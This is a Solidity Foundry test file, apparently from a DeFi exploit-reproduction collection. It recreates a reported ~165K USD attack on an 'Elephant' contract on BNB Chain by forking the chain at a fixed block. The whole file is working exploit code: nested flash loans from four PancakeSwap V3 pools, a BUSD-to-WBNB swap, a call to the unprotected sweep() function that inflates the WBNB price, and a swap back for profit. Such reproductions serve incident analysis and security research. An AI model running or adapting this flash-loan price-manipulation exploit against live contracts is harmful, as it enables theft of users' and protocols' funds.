// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~165K USD$
// Attacker : https://bscscan.com/address/0xbbcc139933d1580e7c40442e09263e90e6f1d66d
// Attack Contract : https://bscscan.com/address/0x69bd13f775505989883768ebd23d528c708d6bcf
// Vulnerable Contract : https://bscscan.com/address/0x8cf0a553ab3896e4832ebcc519a7a60828ab5740
// Attack Tx : https://explorer.phalcon.xyz/tx/bsc/0xd423ae0e95e9d6c8a89dcfed243573867e4aad29ee99a9055728cbbe0a523439

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1732354930529435940

interface IElephantStatus {
    function sweep() external;
}

contract ContractTest is Test {
    Uni_Pair_V3 private constant USDC_BUSD =
        Uni_Pair_V3(0x22536030B9cE783B6Ddfb9a39ac7F439f568E5e6);
    Uni_Pair_V3 private constant BUSDT_BUSD =
        Uni_Pair_V3(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
    Uni_Pair_V3 private constant WBNB_BUSD =
        Uni_Pair_V3(0x85FAac652b707FDf6907EF726751087F9E0b6687);
    Uni_Pair_V3 private constant BTCB_BUSD =
        Uni_Pair_V3(0x369482C78baD380a036cAB827fE677C1903d1523);
    Uni_Router_V2 private constant PancakeRouter =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 private constant BUSD =
        IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 private constant WBNB =
        IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IElephantStatus private constant Elephant =
        IElephantStatus(0x8Cf0A553aB3896e4832ebCC519a7A60828AB5740);

    function setUp() public {
        vm.createSelectFork("bsc", 34114760);
        vm.label(address(USDC_BUSD), "USDC_BUSD");
        vm.label(address(BUSDT_BUSD), "BUSDT_BUSD");
        vm.label(address(WBNB_BUSD), "WBNB_BUSD");
        vm.label(address(BTCB_BUSD), "BTCB_BUSD");
        vm.label(address(PancakeRouter), "PancakeRouter");
        vm.label(address(BUSD), "BUSD");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(Elephant), "Elephant");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter BUSD balance before attack",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );

        USDC_BUSD.flash(
            address(this),
            0,
            BUSD.balanceOf(address(USDC_BUSD)),
            abi.encode(uint8(0), BUSD.balanceOf(address(USDC_BUSD)))
        );

        emit log_named_decimal_uint(
            "Exploiter BUSD balance after attack",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        uint8 num;
        uint256 amount;
        (num, amount) = abi.decode(data, (uint8, uint256));
        if (num == uint8(0)) {
            BUSDT_BUSD.flash(
                address(this),
                0,
                BUSD.balanceOf(address(BUSDT_BUSD)),
                abi.encode(uint8(1), BUSD.balanceOf(address(BUSDT_BUSD)))
            );
        } else if (num == uint8(1)) {
            WBNB_BUSD.flash(
                address(this),
                0,
                BUSD.balanceOf(address(WBNB_BUSD)),
                abi.encode(uint8(2), BUSD.balanceOf(address(WBNB_BUSD)))
            );
        } else if (num == uint8(2)) {
            BTCB_BUSD.flash(
                address(this),
                0,
                BUSD.balanceOf(address(BTCB_BUSD)),
                abi.encode(uint8(3), BUSD.balanceOf(address(BTCB_BUSD)))
            );
        } else {
            BUSD.approve(address(PancakeRouter), type(uint256).max);
            WBNB.approve(address(PancakeRouter), type(uint256).max);
            BUSDToWBNB();
            // Unprotected function here. Call to sweep will rise WBNB price
            Elephant.sweep();
            WBNBToBUSD();
        }
        BUSD.transfer(msg.sender, amount + fee1);
    }

    function BUSDToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSD);
        path[1] = address(WBNB);
        PancakeRouter.swapExactTokensForTokens(
            BUSD.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function WBNBToBUSD() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BUSD);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
